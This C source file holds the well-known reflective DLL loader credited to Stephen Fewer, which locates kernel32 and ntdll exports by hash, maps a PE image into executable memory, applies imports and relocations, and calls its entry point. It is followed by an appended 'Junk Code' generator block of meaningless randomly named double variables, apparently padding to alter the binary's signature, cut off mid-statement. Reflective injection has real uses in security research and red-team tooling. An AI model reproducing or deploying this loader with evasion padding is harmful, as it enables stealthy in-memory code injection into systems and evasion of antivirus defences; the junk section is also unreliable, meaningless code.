//===============================================================================================//
// Copyright (c) 2012, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
// All rights reserved.
// 
// Redistribution and use in source and binary forms, with or without modification, are permitted 
// provided that the following conditions are met:
// 
//     * Redistributions of source code must retain the above copyright notice, this list of 
// conditions and the following disclaimer.
// 
//     * Redistributions in binary form must reproduce the above copyright notice, this list of 
// conditions and the following disclaimer in the documentation and/or other materials provided 
// with the distribution.
// 
//     * Neither the name of Harmony Security nor the names of its contributors may be used to
// endorse or promote products derived from this software without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
// IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
// FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
// OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
// POSSIBILITY OF SUCH DAMAGE.
//===============================================================================================//
#include "ReflectiveLoader.h"
//===============================================================================================//
// Our loader will set this to a pseudo correct HINSTANCE/HMODULE value
HINSTANCE hAppInstance = NULL;
//===============================================================================================//
#pragma intrinsic( _ReturnAddress )
// This function can not be inlined by the compiler or we will not get the address we expect. Ideally 
// this code will be compiled with the /O2 and /Ob1 switches. Bonus points if we could take advantage of 
// RIP relative addressing in this instance but I dont believe we can do so with the compiler intrinsics 
// available (and no inline asm available under x64).
__declspec(noinline) ULONG_PTR caller( VOID ) { return (ULONG_PTR)_ReturnAddress(); }
//===============================================================================================//
// Note 1: If you want to have your own DllMain, define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN,  

//         otherwise the DllMain at the end of this file will be used.

// Note 2: If you are injecting the DLL via LoadRemoteLibraryR, define REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR,
//         otherwise it is assumed you are calling the ReflectiveLoader via a stub.

// This is our position independent reflective DLL loader/injector

#define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN

#ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( LPVOID lpParameter )
#else
DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
#endif
{
	// the functions we need
	LOADLIBRARYA pLoadLibraryA     = NULL;
	GETPROCADDRESS pGetProcAddress = NULL;
	VIRTUALALLOC pVirtualAlloc     = NULL;
	NTFLUSHINSTRUCTIONCACHE pNtFlushInstructionCache = NULL;

	USHORT usCounter;

	// the initial location of this image in memory
	ULONG_PTR uiLibraryAddress;
	// the kernels base address and later this images newly loaded base address
	ULONG_PTR uiBaseAddress;

	// variables for processing the kernels export table
	ULONG_PTR uiAddressArray;
	ULONG_PTR uiNameArray;
	ULONG_PTR uiExportDir;
	ULONG_PTR uiNameOrdinals;
	DWORD dwHashValue;

	// variables for loading this image
	ULONG_PTR uiHeaderValue;
	ULONG_PTR uiValueA;
	ULONG_PTR uiValueB;
	ULONG_PTR uiValueC;
	ULONG_PTR uiValueD;
	ULONG_PTR uiValueE;

	// STEP 0: calculate our images current base address

	// we will start searching backwards from our callers return address.
	uiLibraryAddress = caller();

	// loop through memory backwards searching for our images base address
	// we dont need SEH style search as we shouldnt generate any access violations with this
	while( TRUE )
	{
		if( ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_magic == IMAGE_DOS_SIGNATURE )
		{
			uiHeaderValue = ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;
			// some x64 dll's can trigger a bogus signature (IMAGE_DOS_SIGNATURE == 'POP r10'),
			// we sanity check the e_lfanew with an upper threshold value of 1024 to avoid problems.
			if( uiHeaderValue >= sizeof(IMAGE_DOS_HEADER) && uiHeaderValue < 1024 )
			{
				uiHeaderValue += uiLibraryAddress;
				// break if we have found a valid MZ/PE header
				if( ((PIMAGE_NT_HEADERS)uiHeaderValue)->Signature == IMAGE_NT_SIGNATURE )
					break;
			}
		}
		uiLibraryAddress--;
	}

	// STEP 1: process the kernels exports for the functions our loader needs...

	// get the Process Enviroment Block
#ifdef WIN_X64
	uiBaseAddress = __readgsqword( 0x60 );
#else
#ifdef WIN_X86
	uiBaseAddress = __readfsdword( 0x30 );
#else WIN_ARM
	//uiBaseAddress = *(DWORD *)( (BYTE *)_MoveFromCoprocessor( 15, 0, 13, 0, 2 ) + 0x30 );
#endif
#endif

	// get the processes loaded modules. ref: http://msdn.microsoft.com/en-us/library/aa813708(VS.85).aspx
	uiBaseAddress = (ULONG_PTR)((_PPEB)uiBaseAddress)->pLdr;

	// get the first entry of the InMemoryOrder module list
	uiValueA = (ULONG_PTR)((PPEB_LDR_DATA)uiBaseAddress)->InMemoryOrderModuleList.Flink;
	while( uiValueA )
	{
		// get pointer to current modules name (unicode string)
		uiValueB = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->BaseDllName.pBuffer;
		// set bCounter to the length for the loop
		usCounter = ((PLDR_DATA_TABLE_ENTRY)uiValueA)->BaseDllName.Length;
		// clear uiValueC which will store the hash of the module name
		uiValueC = 0;

		// compute the hash of the module name...
		do
		{
			uiValueC = ror( (DWORD)uiValueC );
			// normalize to uppercase if the madule name is in lowercase
			if( *((BYTE *)uiValueB) >= 'a' )
				uiValueC += *((BYTE *)uiValueB) - 0x20;
			else
				uiValueC += *((BYTE *)uiValueB);
			uiValueB++;
		} while( --usCounter );

		// compare the hash with that of kernel32.dll
		if( (DWORD)uiValueC == KERNEL32DLL_HASH )
		{
			// get this modules base address
			uiBaseAddress = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->DllBase;

			// get the VA of the modules NT Header
			uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

			// uiNameArray = the address of the modules export directory entry
			uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

			// get the VA of the export directory
			uiExportDir = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress );

			// get the VA for the array of name pointers
			uiNameArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNames );
			
			// get the VA for the array of name ordinals
			uiNameOrdinals = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNameOrdinals );

			usCounter = 3;

			// loop while we still have imports to find
			while( usCounter > 0 )
			{
				// compute the hash values for this function name
				dwHashValue = hash( (char *)( uiBaseAddress + DEREF_32( uiNameArray ) )  );
				
				// if we have found a function we want we get its virtual address
				if( dwHashValue == LOADLIBRARYA_HASH || dwHashValue == GETPROCADDRESS_HASH || dwHashValue == VIRTUALALLOC_HASH )
				{
					// get the VA for the array of addresses
					uiAddressArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions );

					// use this functions name ordinal as an index into the array of name pointers
					uiAddressArray += ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );

					// store this functions VA
					if( dwHashValue == LOADLIBRARYA_HASH )
						pLoadLibraryA = (LOADLIBRARYA)( uiBaseAddress + DEREF_32( uiAddressArray ) );
					else if( dwHashValue == GETPROCADDRESS_HASH )
						pGetProcAddress = (GETPROCADDRESS)( uiBaseAddress + DEREF_32( uiAddressArray ) );
					else if( dwHashValue == VIRTUALALLOC_HASH )
						pVirtualAlloc = (VIRTUALALLOC)( uiBaseAddress + DEREF_32( uiAddressArray ) );
			
					// decrement our counter
					usCounter--;
				}

				// get the next exported function name
				uiNameArray += sizeof(DWORD);

				// get the next exported function name ordinal
				uiNameOrdinals += sizeof(WORD);
			}
		}
		else if( (DWORD)uiValueC == NTDLLDLL_HASH )
		{
			// get this modules base address
			uiBaseAddress = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->DllBase;

			// get the VA of the modules NT Header
			uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

			// uiNameArray = the address of the modules export directory entry
			uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

			// get the VA of the export directory
			uiExportDir = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress );

			// get the VA for the array of name pointers
			uiNameArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNames );
			
			// get the VA for the array of name ordinals
			uiNameOrdinals = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNameOrdinals );

			usCounter = 1;

			// loop while we still have imports to find
			while( usCounter > 0 )
			{
				// compute the hash values for this function name
				dwHashValue = hash( (char *)( uiBaseAddress + DEREF_32( uiNameArray ) )  );
				
				// if we have found a function we want we get its virtual address
				if( dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH )
				{
					// get the VA for the array of addresses
					uiAddressArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions );

					// use this functions name ordinal as an index into the array of name pointers
					uiAddressArray += ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );

					// store this functions VA
					if( dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH )
						pNtFlushInstructionCache = (NTFLUSHINSTRUCTIONCACHE)( uiBaseAddress + DEREF_32( uiAddressArray ) );

					// decrement our counter
					usCounter--;
				}

				// get the next exported function name
				uiNameArray += sizeof(DWORD);

				// get the next exported function name ordinal
				uiNameOrdinals += sizeof(WORD);
			}
		}

		// we stop searching when we have found everything we need.
		if( pLoadLibraryA && pGetProcAddress && pVirtualAlloc && pNtFlushInstructionCache )
			break;

		// get the next entry
		uiValueA = DEREF( uiValueA );
	}

	// STEP 2: load our image into a new permanent location in memory...

	// get the VA of the NT Header for the PE to be loaded
	uiHeaderValue = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;

	// allocate all the memory for the DLL to be loaded into. we can load at any address because we will  
	// relocate the image. Also zeros all memory and marks it as READ, WRITE and EXECUTE to avoid any problems.
	uiBaseAddress = (ULONG_PTR)pVirtualAlloc( NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );

	// we must now copy over the headers
	uiValueA = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders;
	uiValueB = uiLibraryAddress;
	uiValueC = uiBaseAddress;

	while( uiValueA-- )
		*(BYTE *)uiValueC++ = *(BYTE *)uiValueB++;

	// STEP 3: load in all of our sections...

	// uiValueA = the VA of the first section
	uiValueA = ( (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader );
	
	// itterate through all sections, loading them into memory.
	uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections;
	while( uiValueE-- )
	{
		// uiValueB is the VA for this section
		uiValueB = ( uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress );

		// uiValueC if the VA for this sections data
		uiValueC = ( uiLibraryAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->PointerToRawData );

		// copy the section over
		uiValueD = ((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData;

		while( uiValueD-- )
			*(BYTE *)uiValueB++ = *(BYTE *)uiValueC++;

		// get the VA of the next section
		uiValueA += sizeof( IMAGE_SECTION_HEADER );
	}

	// STEP 4: process our images import table...

	// uiValueB = the address of the import directory
	uiValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];
	
	// we assume their is an import table to process
	// uiValueC is the first entry in the import table
	uiValueC = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress );
	
	// itterate through all imports
	while( ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name )
	{
		// use LoadLibraryA to load the imported module into memory
		uiLibraryAddress = (ULONG_PTR)pLoadLibraryA( (LPCSTR)( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name ) );

		// uiValueD = VA of the OriginalFirstThunk
		uiValueD = ( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->OriginalFirstThunk );
	
		// uiValueA = VA of the IAT (via first thunk not origionalfirstthunk)
		uiValueA = ( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->FirstThunk );

		// itterate through all imported functions, importing by ordinal if no name present
		while( DEREF(uiValueA) )
		{
			// sanity check uiValueD as some compilers only import by FirstThunk
			if( uiValueD && ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal & IMAGE_ORDINAL_FLAG )
			{
				// get the VA of the modules NT Header
				uiExportDir = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;

				// uiNameArray = the address of the modules export directory entry
				uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

				// get the VA of the export directory
				uiExportDir = ( uiLibraryAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress );

				// get the VA for the array of addresses
				uiAddressArray = ( uiLibraryAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions );

				// use the import ordinal (- export ordinal base) as an index into the array of addresses
				uiAddressArray += ( ( IMAGE_ORDINAL( ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal ) - ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->Base ) * sizeof(DWORD) );

				// patch in the address for this imported function
				DEREF(uiValueA) = ( uiLibraryAddress + DEREF_32(uiAddressArray) );
			}
			else
			{
				// get the VA of this functions import by name struct
				uiValueB = ( uiBaseAddress + DEREF(uiValueA) );

				// use GetProcAddress and patch in the address for this imported function
				DEREF(uiValueA) = (ULONG_PTR)pGetProcAddress( (HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name );
			}
			// get the next imported function
			uiValueA += sizeof( ULONG_PTR );
			if( uiValueD )
				uiValueD += sizeof( ULONG_PTR );
		}

		// get the next import
		uiValueC += sizeof( IMAGE_IMPORT_DESCRIPTOR );
	}

	// STEP 5: process all of our images relocations...

	// calculate the base address delta and perform relocations (even if we load at desired image base)
	uiLibraryAddress = uiBaseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;

	// uiValueB = the address of the relocation directory
	uiValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];

	// check if their are any relocations present
	if( ((PIMAGE_DATA_DIRECTORY)uiValueB)->Size )
	{
		// uiValueC is now the first entry (IMAGE_BASE_RELOCATION)
		uiValueC = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress );

		// and we itterate through all entries...
		while( ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock )
		{
			// uiValueA = the VA for this relocation block
			uiValueA = ( uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)->VirtualAddress );

			// uiValueB = number of entries in this relocation block
			uiValueB = ( ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION) ) / sizeof( IMAGE_RELOC );

			// uiValueD is now the first entry in the current relocation block
			uiValueD = uiValueC + sizeof(IMAGE_BASE_RELOCATION);

			// we itterate through all the entries in the current block...
			while( uiValueB-- )
			{
				// perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.
				// we dont use a switch statement to avoid the compiler building a jump table
				// which would not be very position independent!
				if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_DIR64 )
					*(ULONG_PTR *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += uiLibraryAddress;
				else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGHLOW )
					*(DWORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += (DWORD)uiLibraryAddress;
#ifdef WIN_ARM
				// Note: On ARM, the compiler optimization /O2 seems to introduce an off by one issue, possibly a code gen bug. Using /O1 instead avoids this problem.
				else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_ARM_MOV32T )
				{	
					register DWORD dwInstruction;
					register DWORD dwAddress;
					register WORD wImm;
					// get the MOV.T instructions DWORD value (We add 4 to the offset to go past the first MOV.W which handles the low word)
					dwInstruction = *(DWORD *)( uiValueA + ((PIMAGE_RELOC)uiValueD)->offset + sizeof(DWORD) );
					// flip the words to get the instruction as expected
					dwInstruction = MAKELONG( HIWORD(dwInstruction), LOWORD(dwInstruction) );
					// sanity chack we are processing a MOV instruction...
					if( (dwInstruction & ARM_MOV_MASK) == ARM_MOVT )
					{
						// pull out the encoded 16bit value (the high portion of the address-to-relocate)
						wImm  = (WORD)( dwInstruction & 0x000000FF);
						wImm |= (WORD)((dwInstruction & 0x00007000) >> 4);
						wImm |= (WORD)((dwInstruction & 0x04000000) >> 15);
						wImm |= (WORD)((dwInstruction & 0x000F0000) >> 4);
						// apply the relocation to the target address
						dwAddress = ( (WORD)HIWORD(uiLibraryAddress) + wImm ) & 0xFFFF;
						// now create a new instruction with the same opcode and register param.
						dwInstruction  = (DWORD)( dwInstruction & ARM_MOV_MASK2 );
						// patch in the relocated address...
						dwInstruction |= (DWORD)(dwAddress & 0x00FF);
						dwInstruction |= (DWORD)(dwAddress & 0x0700) << 4;
						dwInstruction |= (DWORD)(dwAddress & 0x0800) << 15;
						dwInstruction |= (DWORD)(dwAddress & 0xF000) << 4;
						// now flip the instructions words and patch back into the code...
						*(DWORD *)( uiValueA + ((PIMAGE_RELOC)uiValueD)->offset + sizeof(DWORD) ) = MAKELONG( HIWORD(dwInstruction), LOWORD(dwInstruction) );
					}
				}
#endif
				else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGH )
					*(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += HIWORD(uiLibraryAddress);
				else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_LOW )
					*(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += LOWORD(uiLibraryAddress);

				// get the next entry in the current relocation block
				uiValueD += sizeof( IMAGE_RELOC );
			}

			// get the next entry in the relocation directory
			uiValueC = uiValueC + ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock;
		}
	}

	// STEP 6: call our images entry point

	// uiValueA = the VA of our newly loaded DLL/EXE's entry point
	uiValueA = ( uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint );

	// We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
	pNtFlushInstructionCache( (HANDLE)-1, NULL, 0 );

	// call our respective entry point, fudging our hInstance value
#ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
	// if we are injecting a DLL via LoadRemoteLibraryR we call DllMain and pass in our parameter (via the DllMain lpReserved parameter)
	((DLLMAIN)uiValueA)( (HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, lpParameter );
#else
	// if we are injecting an DLL via a stub we call DllMain with no parameter
	((DLLMAIN)uiValueA)( (HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, NULL );
#endif

	// STEP 8: return our new entry point address so whatever called us can call DllMain() if needed.
	return uiValueA;
}
//===============================================================================================//
#ifndef REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN

BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;
	switch( dwReason ) 
    { 
		case DLL_QUERY_HMODULE:
			if( lpReserved != NULL )
				*(HMODULE *)lpReserved = hAppInstance;
			break;
		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}

#endif

// Junk Code By Troll Face & Thaisen's Gen
void IcipxEreJyIshRLOAtEmqpKUxGIhCry705776() {     double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma16429667 = -292794435;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma84635514 = -734976651;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma69082890 = -248541698;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma8486037 = -996427658;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma61411694 = -528293915;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma82240372 = -667817822;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma80135354 = 40292205;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma91428434 = -669982816;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma21593470 = -231391633;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma7748303 = -55054821;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma82912981 = -753162074;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma79183897 = -721379315;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma4519614 = 66193478;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma49199872 = -553404241;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma998471 = -665390874;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma63193975 = 91085881;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma59802048 = -251733853;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma84463494 = 47483192;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma73469946 = -230374931;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma83993282 = -777679308;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma75191820 = -377406887;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma38190105 = -896926527;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma97303585 = -408473446;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma19567674 = -520809214;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma8640290 = -470005355;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma10738057 = -962403548;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma54313346 = -451717555;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma46679927 = -163195443;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma48816685 = 99423332;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma68363007 = -489461127;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma68520424 = -486964093;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma39530209 = -706961563;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma94081154 = -274771726;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma38129214 = -681086089;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma91938317 = 44501890;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma20074534 = 57777531;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma4645667 = -335346896;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma4901968 = -283828788;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma29531995 = -950460032;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma50724698 = -416272161;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma35518042 = -731106238;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma35581971 = -375399798;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma82390355 = -935551675;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma35300811 = -706177343;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma66979136 = 3848383;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma49394158 = -918452030;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma90483431 = -359758536;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma25575946 = -290977328;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma81248695 = -467167188;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma1430680 = -740311489;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma85098459 = -625577384;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma49503518 = 75189239;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma52746810 = -348866254;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma18348728 = -165518440;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma25513956 = -263033116;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma78239562 = -395867908;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma87331928 = -226503205;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma49515217 = -727732485;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma99845746 = -426422304;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma50673637 = -565890367;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma27927026 = -116100267;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma33455428 = -796512352;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma42611750 = -669406148;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma53230463 = -741930507;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma39227878 = -568090729;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma43382773 = 53799488;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma85102742 = -346607590;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma66390399 = -252720433;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma57261554 = -497906131;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma80923936 = -623168406;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma58548308 = -573567224;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma54900080 = -967905066;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma54931500 = -2056776;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma22745248 = -814102771;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma48475240 = 53426930;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma39609849 = 97992910;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma55799750 = -961374852;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma62002775 = -702296104;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma52588537 = -424657597;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma59246132 = -551553326;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma20254626 = -502645012;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma28737401 = -60740228;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma65431232 = -696028256;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma47386005 = -160265180;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma83264547 = -863883743;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma19016907 = -462153332;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma86783399 = -258095309;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma75732426 = -9253286;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma12615258 = -318052974;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma13698756 = -559630202;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma32742605 = -715719264;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma55130449 = -607614412;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma5056222 = -857406485;    double 